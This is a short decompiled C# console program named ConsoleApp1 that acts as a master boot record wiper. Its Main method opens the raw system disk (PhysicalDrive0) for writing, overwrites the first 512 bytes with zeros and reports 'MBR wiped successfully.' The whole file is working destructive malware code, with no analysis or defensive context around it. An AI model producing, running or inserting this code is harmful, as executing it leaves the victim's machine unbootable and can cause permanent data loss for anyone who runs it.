// Decompiled with JetBrains decompiler
// Type: Program
// Assembly: ConsoleApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 372E7C38-97AC-41C2-AE76-6AE87833B89A

using System;
using System.IO;

#nullable disable
internal class Program
{
  private static void Main()
  {
    string drivePath = "\\\\.\\PhysicalDrive0";
    try
    {
      Program.WipeMBR(drivePath);
      Console.WriteLine("MBR wiped successfully.");
    }
    catch (Exception ex)
    {
      Console.WriteLine("An error occurred: " + ex.Message);
    }
  }

  private static void WipeMBR(string drivePath)
  {
    byte[] buffer = new byte[512 /*0x0200*/];
    using (FileStream fileStream = new FileStream(drivePath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
    {
      fileStream.Seek(0L, SeekOrigin.Begin);
      fileStream.Write(buffer, 0, 512 /*0x0200*/);
    }
  }
}
